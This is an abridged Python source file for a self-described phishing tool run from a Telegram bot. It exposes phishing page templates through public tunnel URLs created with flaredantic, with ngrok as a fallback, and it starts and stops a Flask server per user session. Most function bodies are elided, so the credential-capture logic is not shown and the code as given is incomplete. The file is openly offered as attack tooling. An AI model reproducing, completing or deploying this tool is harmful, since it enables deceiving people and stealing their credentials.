#!/usr/bin/env python3
"""
PHISHING TOOL WITH TELEGRAM BOT – Public URLs using flaredantic
"""
import os
import sys
import time
...
try:
    ...
    print("[!] flaredantic not installed. Install with: pip install flaredantic")
    FLAREDANTIC_AVAILABLE = False
    # Fallback to ngrok (optional)
...
def start_tunnel(port):
    ...
    try:
        ...
        # No process to manage; flaredantic runs in background.
        # We return a dummy process object (None) since we don't need to terminate it.
...
async def start_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not url:
        flask_proc.terminate()
        await update.message.reply_text("❌ Tunnel failed. Make sure flaredantic is installed and try again.")
        return
...
async def stop_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id not in user_sessions:
        ...
        return
    session = user_sessions[user_id]
    # flaredantic runs in background; we can't easily terminate it.
    # We'll just remove the session.
...
if __name__ == "__main__":
    ...
    print("      PUBLIC LINKS (flaredantic)")
    print("="*50)
    all_templates = get_all_templates()
    if all_templates:
